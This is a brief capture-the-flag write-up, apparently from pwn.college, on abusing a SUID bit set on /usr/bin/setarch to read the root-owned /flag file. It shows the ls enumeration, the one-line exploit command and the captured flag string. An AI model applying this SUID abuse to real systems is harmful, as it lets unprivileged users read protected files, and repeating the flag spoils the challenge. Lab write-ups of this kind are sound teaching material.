## üß† Summary:
The challenge abuses a SUID bit set on `/usr/bin/setarch`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## üîç Enumeration

```bash
ls -l /usr/bin/setarch
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/setarch
```

-The `s` in `-rws` indicates it's a SUID binary.
-`setarch` runs with **root privileges**.

## üöÄ Exploitation

The `setarch` command in Linux is used to change the architecture or personality of a process before executing it. 


```bash
setarch linux64 cat /flag
```

Output:
```
pwn.college{k2RylRehP4RmVHIWovP1YNHQHzU.dJzNxwSM0IzMyEzW}
```
